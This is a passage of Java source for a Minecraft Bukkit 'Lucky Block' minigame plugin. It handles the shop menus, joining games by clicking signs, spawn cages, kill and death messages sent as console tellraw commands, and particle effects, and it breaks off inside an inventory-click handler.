package com.LuckyBlock.Events;

import com.LuckyBlock.Commands.GameCommands;
import com.LuckyBlock.Commands.LuckyBlockCommand;
import com.LuckyBlock.Engine.LuckyBlock;
import com.LuckyBlock.Engine.LuckyBlockAPI;
import com.LuckyBlock.Inventory.ItemMaker;
import com.LuckyBlock.PluginEvents.BlockBreakInGameEvent;
import com.LuckyBlock.PluginEvents.BlockPlaceInGameEvent;
import com.LuckyBlock.Resources.ParticleEffect;
import com.LuckyBlock.Resources.SchedulerTask;
import com.LuckyBlock.Resources.Team;
import com.LuckyBlock.War.Cage;
import com.LuckyBlock.War.Hat;
import com.LuckyBlock.War.Particle;
import com.LuckyBlock.War.War;
import com.LuckyBlock.War.War.RewardType;
import com.LuckyBlock.enums.WarType;
import org.bukkit.BanList.Type;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.block.Sign;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.*;
import org.bukkit.event.enchantment.PrepareItemEnchantEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.entity.EntityDamageEvent.DamageCause;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.inventory.FurnaceInventory;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.projectiles.ProjectileSource;

import java.util.*;

@SuppressWarnings({"unused", "deprecation"})
public class Game implements Listener {


    public static ChatColor red = ChatColor.RED;
    public static ChatColor blue = ChatColor.BLUE;
    public static ChatColor aqua = ChatColor.AQUA;
    public static ChatColor black = ChatColor.BLACK;
    public static ChatColor bold = ChatColor.BOLD;
    public static ChatColor darkaqua = ChatColor.DARK_AQUA;
    public static ChatColor darkblue = ChatColor.DARK_BLUE;
    public static ChatColor darkgray = ChatColor.DARK_GRAY;
    public static ChatColor darkgreen = ChatColor.DARK_GREEN;
    public static ChatColor darkpurple = ChatColor.DARK_PURPLE;
    public static ChatColor darkred = ChatColor.DARK_RED;
    public static ChatColor gold = ChatColor.GOLD;
    public static ChatColor gray = ChatColor.GRAY;
    public static ChatColor green = ChatColor.GREEN;
    public static ChatColor italic = ChatColor.ITALIC;
    public static ChatColor lightpurple = ChatColor.LIGHT_PURPLE;
    public static ChatColor magic = ChatColor.MAGIC;
    public static ChatColor reset = ChatColor.RESET;
    public static ChatColor strikethrough = ChatColor.STRIKETHROUGH;
    public static ChatColor underline = ChatColor.UNDERLINE;
    public static ChatColor white = ChatColor.WHITE;
    public static ChatColor yellow = ChatColor.YELLOW;
    Random random = new Random();

    public static void openShop(Player player) {
        Inventory inv = Bukkit.createInventory(player, 45, darkgreen + "Lucky Block Shop");
        UUID uuid = player.getUniqueId();
        ChatColor red = ChatColor.RED;
        ChatColor blue = ChatColor.BLUE;
        ChatColor aqua = ChatColor.AQUA;
        ChatColor black = ChatColor.BLACK;
        ChatColor bold = ChatColor.BOLD;
        ChatColor darkaqua = ChatColor.DARK_AQUA;
        ChatColor darkblue = ChatColor.DARK_BLUE;
        ChatColor darkgray = ChatColor.DARK_GRAY;
        ChatColor darkgreen = ChatColor.DARK_GREEN;
        ChatColor darkpurple = ChatColor.DARK_PURPLE;
        ChatColor darkred = ChatColor.DARK_RED;
        ChatColor gold = ChatColor.GOLD;
        ChatColor gray = ChatColor.GRAY;
        ChatColor green = ChatColor.GREEN;
        ChatColor italic = ChatColor.ITALIC;
        ChatColor lightpurple = ChatColor.LIGHT_PURPLE;
        ChatColor magic = ChatColor.MAGIC;
        ChatColor reset = ChatColor.RESET;
        ChatColor strikethrough = ChatColor.STRIKETHROUGH;
        ChatColor underline = ChatColor.UNDERLINE;
        ChatColor white = ChatColor.WHITE;
        ChatColor yellow = ChatColor.YELLOW;
        ItemStack[] items = new ItemStack[32];
        items[0] = ItemMaker.createItem(Material.DIAMOND_SWORD, 1, (short) 0, aqua + "" + bold + "Items Shop",
                Arrays.asList(gray + "Unlock tools here", "", green + "Click to open"));
        items[1] = ItemMaker.createItem(Material.BLAZE_POWDER, 1, (short) 0, aqua + "" + bold + "Skills Shop",
                Arrays.asList(gray + "Upgrade your skills here", "", green + "Click to open"));
        items[2] = ItemMaker.createItem(Material.EGG, 1, (short) 0, aqua + "" + bold + "Shop+",
                Arrays.asList(gray + "Unlock more items here", "", green + "Click to open"));
        items[3] = ItemMaker.createItem(Material.DIAMOND_HELMET, 1, (short) 0, aqua + "" + bold + "Hats Shop",
                Arrays.asList(gray + "Unlock hats here", "", green + "Click to open"));
        items[4] = ItemMaker.createItem(Material.STAINED_GLASS, 1, (short) 11, aqua + "" + bold + "Cages Shop",
                Arrays.asList(gray + "Change your cage here", "", green + "Click to open"));
        ItemStack back = new ItemStack(Material.COMPASS);
        ItemStack moneyitem = new ItemStack(Material.EMERALD);
        ItemMeta backM = back.getItemMeta();
        ItemMeta moneyitemM = moneyitem.getItemMeta();
        List<String> list = new ArrayList<String>();
        backM.setDisplayName(red + "" + bold + "Close");
        moneyitemM.setDisplayName(yellow + "Data");
        list.add(gray + "Click to Close");
        backM.setLore(list);
        list.clear();
        list.add(gold + "Money: " + green + LuckyBlockAPI.money.get(uuid));
        list.add(gold + "Gold: " + green + LuckyBlockAPI.golds.get(uuid));
        moneyitemM.setLore(list);
        list.clear();
        back.setItemMeta(backM);
        moneyitem.setItemMeta(moneyitemM);
        for (int x = 0; x < items.length; x++) {
            if (items[x] != null) {
                inv.addItem(items[x]);
            }
        }
        inv.setItem(inv.getSize() - 2, moneyitem);
        inv.setItem(inv.getSize() - 1, back);
        inv.setItem(inv.getSize() - 9, ItemMaker.createItem(Material.GOLD_INGOT, 1, 0, yellow + "" + bold + "Convertor",
                Arrays.asList(gray + "Convert coins here")));
        player.openInventory(inv);
        AnimateInv(player, inv, "lbshop");
    }

    public static void AnimateInv(final Player player, final Inventory inv, final String at) {
        final SchedulerTask task = new SchedulerTask();
        task.setId(LuckyBlock.instance.getServer().getScheduler().scheduleSyncRepeatingTask(LuckyBlock.instance, new Runnable() {
            int y = 0;
            int i = 0;

            @Override
            public void run() {
                if (inv.getViewers().contains(player)) {
                    if (at.equalsIgnoreCase("lbshop")) {
                        for (int x = 0; x < 10; x++) {
                            if (inv.getItem(x) != null) {
                                if (inv.getItem(x).hasItemMeta() && inv.getItem(x).getItemMeta().hasLore()) {
                                    List<String> list = inv.getItem(x).getItemMeta().getLore();
                                    if (list.size() > 2) {
                                        list.remove(list.size() - 1);
                                        if (y == 0) {
                                            list.add(green + "\u25BA " + green + "Click to open");
                                        } else if (y == 1) {
                                            list.add(gray + "\u25BA " + green + "Click to open");
                                        }
                                        ItemMeta itemM = inv.getItem(x).getItemMeta();
                                        itemM.setLore(list);
                                        inv.getItem(x).setItemMeta(itemM);
                                        ItemMeta iM = inv.getItem(inv.getSize() - 9).getItemMeta();
                                        iM.setLore(list);
                                        inv.getItem(inv.getSize() - 9).setItemMeta(iM);
                                    }
                                }
                            }
                        }
                    }
                    if (y == 0) {
                        y++;
                    } else {
                        y = 0;
                    }
                } else {
                    task.run();
                }
            }
        }, 1L, 10L));
    }

    public static void openConvertor(Player player) {
        Inventory inv = Bukkit.createInventory(player, 9, yellow + "" + bold + "Convertor Shop");
        inv.setItem(0, ItemMaker.createItem(Material.GOLD_INGOT, 1, 0, yellow + "" + bold + "Money to Gold",
                Arrays.asList("", gray + "Convert $2000 to 1g")));
        inv.setItem(1, ItemMaker.createItem(Material.GOLD_INGOT, 1, 0, yellow + "" + bold + "Money to Gold 1",
                Arrays.asList("", gray + "Convert $20000 to 11g")));
        inv.setItem(2, ItemMaker.createItem(Material.GOLD_INGOT, 1, 0, yellow + "" + bold + "Gold to Money",
                Arrays.asList("", gray + "Convert 1g to $1000")));
        inv.setItem(3, ItemMaker.createItem(Material.GOLD_INGOT, 1, 0, yellow + "" + bold + "Gold to Money 1",
                Arrays.asList("", gray + "Convert 10g to $10000")));
        inv.setItem(inv.getSize() - 1, ItemMaker.createItem(Material.COMPASS, 1, 0, ChatColor.RED + "Back", Arrays.asList(gray + "Click to back")));
        inv.setItem(inv.getSize() - 2, ItemMaker.createItem(Material.EMERALD, 1, 0, yellow + "Data", Arrays.asList(gold + "Money: " + green
                + LuckyBlockAPI.getMoney(player), gold + "Gold: " + green + LuckyBlockAPI.getGold(player))));
        player.openInventory(inv);
    }

    public static boolean joinGame(Player player, int id, boolean showMessages) {
        War war = War.getGame(id);
        UUID uuid = player.getUniqueId();
        boolean can = false;
        if (war.getPlayers().size() < war.getMaxPlayers() || player.hasPermission("lbw.joinfull")) {
            if (war.containsPlayer(player.getUniqueId())) {
                if (showMessages) {
                    //TODO
                    player.sendMessage(red + "You are already in a game!");
                    player.playSound(player.getLocation(), Sound.BAT_TAKEOFF, 0.7f, 2f);
                }
                return false;
            }
            if (war.isEnabled() == false) {
                if (showMessages) {
                    showText(player, "This game is disabled!");
                    player.playSound(player.getLocation(), Sound.BAT_TAKEOFF, 0.7f, 2f);
                }
                return false;
            }
            if (war.inGame() == true) {
                if (showMessages) {
                    showText(player, "This arena is already in-game!");
                    player.playSound(player.getLocation(), Sound.BAT_TAKEOFF, 0.7f, 2f);
                }
                return false;
            }
            war.getPlayers().add(uuid);
            List<String> list1 = new ArrayList<String>();
            for (int xo = 0; xo < war.getPlayers().size(); xo++) {
                list1.add(war.getPlayers().get(xo).toString());
            }
            LuckyBlock.instance.game.set(LuckyBlockAPI.getGameFile(id) + ".Players", list1);
            LuckyBlockAPI.saveConfigs();
            war.reloadSigns();
            if (!war.isAllowGates()) {
                if (war.getLobby() != null) {
                    Location loc = war.getLobby();
                    player.teleport(loc);
                } else {
                    player.sendMessage(war.getMessage("InvalidLobby"));
                }
            } else {
                int g = 0;
                for (int i : war.getPs().values()) {
                    if (g == i) {
                        g++;
                    }
                }
                war.getPs().put(player.getName(), g);
                try {
                    player.teleport(war.getSpawns()[g]);
                    int[] sizes = new int[3];
                    if (war.getType() == WarType.DEFAULT || war.getType() == WarType.INSANE) {
                        sizes[0] = 1;
                        sizes[1] = 2;
                        sizes[2] = 1;
                    } else if (war.getType() == WarType.TEAMS) {

                    }
                    Block block = war.getSpawns()[g].getBlock();
                    for (int x = sizes[0] * -1; x < (sizes[0] + 1); x++) {
                        for (int y = sizes[1] * -1; y < (sizes[1] + 1); y++) {
                            for (int z = sizes[2] * -1; z < (sizes[2] + 1); z++) {
                                block.getLocation().add(x, y, z).getBlock().setType(Cage.selectedcage.get(uuid).getType());
                                block.getLocation().add(x, y, z).getBlock().setData(Cage.selectedcage.get(uuid).getData());
                            }
                        }
                    }
                    for (int x = (sizes[0] * -1) + 1; x < (sizes[0]); x++) {
                        for (int y = (sizes[1] * -1) + 1; y < (sizes[1]); y++) {
                            for (int z = (sizes[2] * -1) + 1; z < (sizes[2]); z++) {
                                block.getLocation().add(x, y, z).getBlock().setType(Material.AIR);
                            }
                        }
                    }
                    player.teleport(war.getSpawns()[g]);
                } catch (Exception ex) {
                    player.sendMessage(red + "Error with spawns!");
                }
            }
            can = true;
            player.playSound(player.getLocation(), Sound.ORB_PICKUP, 100, 1);
            LuckyBlock.instance.data.set("Players." + player.getUniqueId() + ".LastGameID", id);
            player.sendMessage(war.getMessage("JoinGame"));
            LuckyBlock.instance.Loop1(player);
            LuckyBlockAPI.showScoreboard(player, 0);
            PlayParticles(player);
            player.setGameMode(GameMode.ADVENTURE);
            LuckyBlockAPI.xp.put(player.getUniqueId(), player.getExp());
            LuckyBlockAPI.level.put(player.getUniqueId(), player.getLevel());
            LuckyBlockAPI.saveExp(player);
            player.setExp(0);
            player.setLevel(0);
            player.setFoodLevel(20);
            player.closeInventory();
            for (PotionEffect effect : player.getActivePotionEffects()) {
                player.removePotionEffect(effect.getType());
            }
            player.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, 99999, 10));
            ItemStack[] is = player.getInventory().getContents();
            ItemStack[] is1 = player.getInventory().getArmorContents();
            LuckyBlockAPI.inventories.put(uuid, is);
            LuckyBlockAPI.ArmorContents.put(uuid, is1);
            if (war.getPlayers().size() > war.getMinPlayers()) {
                war.startWait();
            }
            player.getInventory().clear();
            player.updateInventory();
            player.getInventory().setHeldItemSlot(0);
            ItemStack chest = ItemMaker.createItem(Material.CHEST, 1, (short) 0, yellow + "" + bold + "Kits" + gray + " (Right Click)",
                    Arrays.asList(gray + "Right click to open kits", ""));
            ItemStack options = ItemMaker.createItem(Material.NETHER_STAR, 1, (short) 0, green + "" + bold + "Options " + gray + "(Right Click)",
                    Arrays.asList(gray + "Right click to open"));
            ItemStack leave = ItemMaker.createItem(Material.SLIME_BALL, 1, (short) 0, darkgreen + "Leave Game" + gray + " (Right Click)", Arrays
                    .asList(gray + "Right click to leave"));
            player.getInventory().addItem(chest);
            player.getInventory().addItem(options);
            player.getInventory().setItem(8, leave);
            String cmd = "give " + player.getName() + " written_book 1 0 {author:" + red + "Owner,title:" + gold + "Information"
                    + ",pages:[\"{text:\\\"Welcome \\\",color:red,bold:true,extra:[{text:\\\""
                    + player.getName() + "\\\",color:light_purple,hoverEvent:{action:show_text,value:{text:\\\"" + player.getName()
                    + "\\\",color:yellow}},clickEvent:{action:run_command,value:\\\"/" + LuckyBlockCommand.lwcmd + " getplayer "
                    + player.getName() + "\\\"}},{text:\\\"      Rules:  \\\",color:gold},{text:\\\"Click Here\\\","
                    + "hoverEvent:{action:show_text,value:{text:\\\"Click Here\\\",color:yellow}},clickEvent:{action:run_command,"
                    + "value:\\\"/" + LuckyBlockCommand.lcmd + " rules\\\"}}]}\",\"{text:\\\"\\\""
                    + ",extra:[{text:\\\"Choose Your Kit by clicking the kit item"
                    + " and change your spawn and other options by clicking the\\\",color:gold,bold:false},{text:"
                    + "\\\" Options Item.\\\",color:red,bold:false,hoverEvent:{action:show_text,value:{text:\\\"Click Here\\\",color:yellow}}"
                    + ",clickEvent:{action:run_command,value:\\\"/" + LuckyBlockCommand.lwcmd + " options\\\"}}]}\"]}";
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
            player.updateInventory();
            if (player.getInventory().getItem(2) != null) {
                player.getInventory().getItem(2).setAmount(1);
            }
            player.updateInventory();
            player.setWalkSpeed(0.2f);
            player.setMaxHealth(20);
            player.setHealth(20);
            for (PotionEffect p : player.getActivePotionEffects()) {
                player.removePotionEffect(p.getType());
            }
            war.reloadSigns();
        } else {
            if (war.inGame() == true) {
                player.sendMessage(war.getMessage("GameAlreadyStarted"));
            } else {
                if (war.isEnabled()) {
                    player.sendMessage(war.getMessage("GameFull"));
                }
            }
        }
        return can;
    }

    public static void showText(Player player, String string) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "tellraw " + player.getName() + " {text:\"" + string + " \",color:red,extra:["
                + "{text:\"Click here to play a random map.\",color:gray,bold:true,hoverEvent:{action:show_text,value:{text:\"Click Here\",color:yellow"
                + ",bold:true}},clickEvent:{action:run_command,value:\"/" + LuckyBlockCommand.lwcmd + " randommap\"}}]}");
    }

    public static void testPlayer(Player player) {
        if (player.getLastDamageCause() instanceof EntityDamageByEntityEvent) {
            EntityDamageByEntityEvent e = (EntityDamageByEntityEvent) player.getLastDamageCause();
            Player pl = null;
            ProjectileSource ps = null;
            LivingEntity ll = null;
            String name = blue + player.getName();
            if (e.getDamager() instanceof Projectile) {
                Projectile p = (Projectile) e.getDamager();
                if (p.getShooter() instanceof Player) {
                    pl = (Player) p.getShooter();
                } else {
                    ps = p.getShooter();
                }
            } else if (e.getDamager() instanceof Player) {
                pl = (Player) e.getDamager();
            }
            if (e.getDamager() instanceof LivingEntity) {
                if (!(e instanceof Player)) {
                    ll = (LivingEntity) e.getDamager();
                }
            }
            if (pl != null) {
                UUID uuid = pl.getUniqueId();
                if (War.getGame(uuid) != null) {
                    War war = War.getGame(uuid);
                    if (!LuckyBlockAPI.money.containsKey(uuid)) {
                        LuckyBlockAPI.money.put(uuid, 0);
                    }
                    if (!LuckyBlockAPI.kills.containsKey(uuid)) {
                        LuckyBlockAPI.kills.put(uuid, 0);
                    }
                    if (!LuckyBlockAPI.multiply.containsKey(uuid)) {
                        LuckyBlockAPI.multiply.put(uuid, 1);
                    }
                    int amplifier = 1;
                    if (war.getType() == WarType.INSANE) {
                        amplifier = 2;
                    }
                    int amount = 20 * LuckyBlockAPI.multiply.get(uuid) * amplifier;
                    war.addReward(uuid, RewardType.MONEY, amount);
                    war.addReward(uuid, RewardType.KILLS, 1);
                    war.addReward(uuid, RewardType.XP, 5);
                    if (Hat.getSelected().get(uuid) == Hat.DIAMOND_HAT) {
                        player.getInventory().addItem(new ItemStack(Material.DIAMOND));
                    }
                    LuckyBlockAPI.savePlayerData(uuid, pl.getName());
                    pl.sendMessage(green + "You Killed " + darkpurple + player.getName() + green + "!");
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (War.containPlayer(p.getUniqueId()) || War.containSpectator(p.getUniqueId())) {
                            if (LuckyBlock.bukkitVersion[1] > 7) {
                                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "tellraw " + p.getName() + " {text:\"" + name + "\",hoverEvent:{"
                                        + "action:show_item,value:\"{id:minecraft:stone,tag:{display:{Name:" + name + ""
                                        + ",Lore:[" + gray + "Lvl " + green + LuckyBlockAPI.playerlevel.get(player.getUniqueId())[0] +
                                        ", ," + gray + "------]}}}\"},extra:[{text:\" was thrown into the void by \",color:red},{text:\"" + pl.getName() + "\",color:gold},"
                                        + "{text:\"!\",color:red}]}");
                            } else {
                                p.sendMessage(name + red + " was thrown into the void by " + gold + pl.getName() + red + "!");
                            }
                        }
                    }
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "tellraw " + player.getName() + " {text:\"" + name + "\",hoverEvent:{"
                            + "action:show_item,value:\"{id:minecraft:stone,tag:{display:{Name:" + name + ""
                            + ",Lore:[" + gray + "Lvl " + green + LuckyBlockAPI.playerlevel.get(player.getUniqueId())[0] +
                            ", ," + gray + "------]}}}\"},extra:[{text:\" was thrown into the void by \",color:red},{text:\"" + pl.getName() + "\",color:gold},"
                            + "{text:\"!\",color:red}]}");
                    pl.playSound(pl.getLocation(), Sound.ORB_PICKUP, 1f, 2f);
                }
            } else if (ps != null) {
                String msg = "";
                if (ps instanceof LivingEntity) {
                    LivingEntity l = (LivingEntity) ps;
                    if (l.getCustomName() == null) {
                        msg = blue + player.getName() + red + " was thrown into the void by " + l.getType().toString().toLowerCase() + "!";
                    } else {
                        msg = blue + player.getName() + red + " was thrown into the void by " + l.getCustomName() + "!";
                    }
                } else {
                    msg = blue + player.getName() + red + " was thrown into the void!";
                }
                for (Player p : Bukkit.getOnlinePlayers()) {
                    if (War.containPlayer(p.getUniqueId()) || War.containSpectator(p.getUniqueId())) {
                        if (LuckyBlock.bukkitVersion[1] > 7) {
                            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "tellraw " + p.getName() + " {text:\"\"}");
                        } else {
                            p.sendMessage(msg);
                        }
                    }
                }
                player.sendMessage(msg);
            } else if (ll != null) {
                String msg = "";
                if (ll.getCustomName() == null) {
                    msg = blue + player.getName() + red + " was thrown into the void by " + ll.getType().toString().toLowerCase() + "!";
                } else {
                    msg = blue + player.getName() + red + " was thrown into the void by " + ll.getCustomName() + "!";
                }
                for (Player p : Bukkit.getOnlinePlayers()) {
                    if (War.containPlayer(p.getUniqueId()) || War.containSpectator(p.getUniqueId())) {
                        p.sendMessage(msg);
                    }
                }
                player.sendMessage(msg);
            }
        }
    }

    public static void PlayParticles(final Player player) {
        final UUID uuid = player.getUniqueId();
        final SchedulerTask task = new SchedulerTask();
        task.setId(LuckyBlock.instance.getServer().getScheduler().scheduleSyncRepeatingTask(LuckyBlock.instance, new Runnable() {
            @Override
            public void run() {
                if (War.containPlayer(uuid)) {
                    if (!War.getGame(uuid).inGame()) {
                        if (Particle.selected.get(uuid) != Particle.NONE) {
                            Particle particle = Particle.selected.get(uuid);
                            if (particle.getEffect() != ParticleEffect.NOTE) {
                                particle.getEffect().display(0.5f, 0.5f, 0.5f, 0, 35, player.getLocation(), 32);
                            } else {
                                particle.getEffect().display(0.5f, 0.5f, 0.5f, 1, 35, player.getLocation(), 32);
                            }
                        }
                    } else {
                        task.run();
                    }
                } else {
                    task.run();
                }
            }
        }, 10L, 15L));
    }

    @EventHandler
    private void LuckyBlockSign(SignChangeEvent event) {
        if (event.getLine(0) == null) {
            return;
        }
        if (event.getLine(0).equalsIgnoreCase("[luckyblock]")) {
            if (event.getPlayer().hasPermission("lb.placesign")) {
                Player player = event.getPlayer();
                Block block = event.getBlock();
                if (!event.getLine(1).startsWith("ID:")) {
                    int id = LuckyBlock.randoms.nextInt(9999) + 1;
                    War war = null;
                    for (int x = 0; x < War.listWars.size(); x++) {
                        if (War.listWars.get(x).getId() == id) {
                            war = War.listWars.get(x);
                        }
                    }
                    if (war == null) {
                        war = new War(id);
                    }
                    war.addBlock(block);
                    war.setName("UNNAMED");
                    event.setLine(0, darkgreen + "LB:" + yellow + war.getId());
                    event.setLine(1, gold + "" + bold + war.getName());
                    event.setLine(2, lightpurple + "" + 0 + white + "/" + lightpurple + war.getMaxPlayers());
                    if (war.getPlayers().size() < war.getMaxPlayers()) {
                        if (war.isEnabled()) {
                            event.setLine(3, green + "Click To Join");
                        } else {
                            event.setLine(3, darkred + "" + bold + "Disabled");
                        }
                    } else {
                        event.setLine(3, darkred + "Full!");
                    }
                    war.save();
                    player.sendMessage(war.getMessage("CreateGame"));
                } else {
                    String[] dd = event.getLine(1).split("ID:");
                    int id = 0;
                    try {
                        id = Integer.parseInt(dd[1]);
                    } catch (NumberFormatException ex) {
                        player.sendMessage(War.getStaticMessage(null, "InvalidID"));
                        return;
                    }
                    War war = null;
                    for (int x = 0; x < War.listWars.size(); x++) {
                        if (War.listWars.get(x).getId() == id) {
                            war = War.listWars.get(x);
                        }
                    }
                    if (war == null) {
                        war = new War(id);
                    }
                    war.addBlock(block);
                    if (war.getName() == null) {
                        war.setName("UNNAMED");
                    }
                    event.setLine(0, darkgreen + "LB:" + yellow + war.getId());
                    event.setLine(1, gold + "" + bold + war.getName());
                    event.setLine(2, lightpurple + "" + 0 + white + "/" + lightpurple + war.getMaxPlayers());
                    if (war.getPlayers().size() < war.getMaxPlayers()) {
                        if (war.isEnabled()) {
                            event.setLine(3, green + "Click To Join");
                        } else {
                            event.setLine(3, darkred + "" + bold + "Disabled");
                        }
                    } else {
                        event.setLine(3, darkred + "Full!");
                    }
                    player.sendMessage(war.getMessage("CreateGame"));
                    war.save();
                }
            }
        }
    }

    @EventHandler
    private void onClickSign(PlayerInteractEvent event) {
        if (event.getClickedBlock() != null) {
            if (event.getClickedBlock().getType() == Material.WALL_SIGN || event.getClickedBlock().getType() == Material.SIGN_POST) {
                Sign sign = (Sign) event.getClickedBlock().getState();
                if (sign.getLines().length > 0) {
                    if (sign.getLine(0) != null) {
                        if (ChatColor.stripColor(sign.getLine(0)).startsWith("LB:") || ChatColor.stripColor(sign.getLine(0)).equalsIgnoreCase("[luckyblock]")) {
                            if (event.getAction() == Action.RIGHT_CLICK_BLOCK) {
                                Player player = event.getPlayer();
                                UUID uuid = player.getUniqueId();
                                Block block = event.getClickedBlock();
                                if (player.isSneaking() == true) {
                                    return;
                                }
                                if (sign.getLine(1) != null) {
                                    if (ChatColor.stripColor(sign.getLine(1)).startsWith("ID:")) {
                                        String[] d = sign.getLine(1).split("ID:");
                                        if (d.length == 2) {
                                            int i = Integer.parseInt(d[1]);
                                            for (int x = 0; x < War.listWars.size(); x++) {
                                                if (War.listWars.get(x).getId() == i) {
                                                    if (War.listWars.get(x).getName() == null) {
                                                        War.listWars.get(x).setName("UNNAMED");
                                                        War.listWars.get(x).reloadSigns();
                                                    }
                                                    return;
                                                }
                                            }
                                        }
                                    }
                                }
                                int id = -1;
                                if (sign.getLine(0) != null) {
                                    String[] d = sign.getLine(0).split("LB:");
                                    if (d.length == 2) {
                                        String n = ChatColor.stripColor(d[1]);
                                        id = Integer.parseInt(n);
                                    }
                                }
                                if (id == -1) {
                                    return;
                                }
                                if (War.getGame(id) == null) {
                                    player.playSound(player.getLocation(), Sound.BAT_TAKEOFF, 0.7f, 2f);
                                    player.sendMessage(War.getStaticMessage(null, "InvalidGame"));
                                    return;
                                }
                                War war = War.getGame(id);
                                if (war.getType() == WarType.VIP) {
                                    if (!player.hasPermission("lbw.vip")) {
                                        player.sendMessage(War.getStaticMessage(null, "NoPermissionGame"));
                                        return;
                                    }
                                }
                                joinGame(player, id, true);
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onDisconnect(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        War war = null;
        for (int y = 0; y < War.listWars.size(); y++) {
            if (War.listWars.get(y).containsPlayer(uuid)) {
                war = War.listWars.get(y);
            }
        }
        if (war != null) {
            if (war.inGame() == true) {
                war.leaveGame(uuid, true, "false");
            } else {
                war.leaveGame(uuid, true, "else");
            }
        }
    }

    @EventHandler
    private void onDeath(PlayerDeathEvent event) {
        Player player = event.getEntity();
        UUID uuid = player.getUniqueId();
        for (int x = 0; x < War.listWars.size(); x++) {
            if (War.listWars.get(x).containsPlayer(uuid)) {
                int total = (int) (player.getLevel() * player.getExp());
                event.setDroppedExp(total);
                String msg = "has died!";
                String[] d = event.getDeathMessage().split(player.getName());
                event.setDeathMessage("");
                War war = War.getGame(uuid);
                for (Player p : Bukkit.getOnlinePlayers()) {
                    if (war.getPlayers().contains(p.getUniqueId()) || war.getSpectators().contains(p.getUniqueId())) {
                        if (d.length > 1) {
                            msg = d[1];
                        }
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "tellraw " + player.getName() + " {text:\"" + p.getName() + " \",color:blue"
                                + ",hoverEvent:{action:show_text,value:\"" + p.getName() + "\"},extra:[{text:\"" + msg + "\",color:red}]}");
                    }
                }
                war.leaveGame(uuid, true, "false");
            }
        }
    }

    @EventHandler
    private void onRightClickNetherStar(PlayerInteractEvent event) {
        if (event.getItem() != null) {
            if (event.getItem().getType() == Material.NETHER_STAR) {
                if (event.getItem().hasItemMeta() && event.getItem().getItemMeta().hasDisplayName()) {
                    if (event.getItem().getItemMeta().getDisplayName().equalsIgnoreCase(red + "" + bold + "Players")) {
                        Player player = event.getPlayer();
                        if (event.getAction() == Action.RIGHT_CLICK_BLOCK || event.getAction() == Action.RIGHT_CLICK_AIR) {
                            War war = null;
                            for (int x = 0; x < War.listWars.size(); x++) {
                                if (War.listWars.get(x).getSpectators().contains(player.getUniqueId())) {
                                    war = War.listWars.get(x);
                                }
                            }
                            if (war != null) {
                                openPlayers(player, war.getId());
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    private void onDamageWhenSpectator(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player) {
            Player player = (Player) event.getDamager();
            if (player.getGameMode() == GameMode.ADVENTURE) {
                UUID uuid = player.getUniqueId();
                if (War.containSpectator(uuid)) {
                    event.setCancelled(true);
                }
            }
        }
    }

    private void openPlayers(Player player, int id) {
        int size = 9;
        War war = War.getGame(id);
        if (war.getPlayers().size() > 9 && war.getPlayers().size() < 19) {
            size = 18;
        } else if (war.getPlayers().size() > 18 && war.getPlayers().size() < 28) {
            size = 27;
        } else if (war.getPlayers().size() > 27 && war.getPlayers().size() < 37) {
            size = 36;
        } else if (war.getPlayers().size() > 36 && war.getPlayers().size() < 46) {
            size = 45;
        } else if (war.getPlayers().size() > 45) {
            size = 54;
        }
        Inventory inv = Bukkit.createInventory(player, size, red + "" + bold + "Players");
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (war.getPlayers().contains(p.getUniqueId())) {
                String name = red + p.getName();
                ItemStack item = new ItemStack(Material.SKULL_ITEM, 1, (short) 3);
                SkullMeta itemM = (SkullMeta) item.getItemMeta();
                itemM.setOwner(p.getName());
                itemM.setDisplayName(name);
                List<String> list = new ArrayList<String>();
                list.add(gray + "Click to spectate");
                itemM.setLore(list);
                item.setItemMeta(itemM);
                inv.addItem(item);
            }
        }
        player.openInventory(inv);
    }

    @EventHandler
    private void onOpenShop(PlayerInteractEvent event) {
        if (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (event.getItem() != null) {
                if (event.getItem().hasItemMeta() && event.getItem().getItemMeta().hasDisplayName()) {
                    if (event.getItem().getItemMeta().getDisplayName().equalsIgnoreCase(green + "Lucky Block Shop")) {
                        Player player = event.getPlayer();
                        LuckyBlockAPI.savePlayerData(player.getUniqueId(), player.getName());
                        openShop(player);
                    }
                }
            }
        }
    }

    @EventHandler
    private void onClickItem(InventoryClickEvent event) {
        if (event.getInventory().getTitle() != null) {
            String title = event.getInventory().getTitle();
            if (title.equalsIgnoreCase(darkgreen + "Lucky Block Shop") || title.equalsIgnoreCase(yellow + "" + bold + "Convertor Shop")) {
                if (!(event.getWhoClicked() instanceof Player)) {
                    return;
                }
                event.setCancelled(true);
                Player player = (Player) event.getWhoClicked();
                if (event.getCurrentItem() != null) {
                    ItemStack item = event.getCurrentItem();
                    if (item.hasItemMeta() && item.getItemMeta().hasDisplayName()) {
                        String name = item.getItemMeta().getDisplayName();
                        if (item.getType() == Material.BLAZE_POWDER) {
                            if (name.equalsIgnoreCase(aqua + "" + bold + "Skills Shop")) {
                                Gui.openSkills(player);
                                player.playSound(player.getLocation(), Sound.CHICKEN_EGG_POP, 1, 0);
                            }
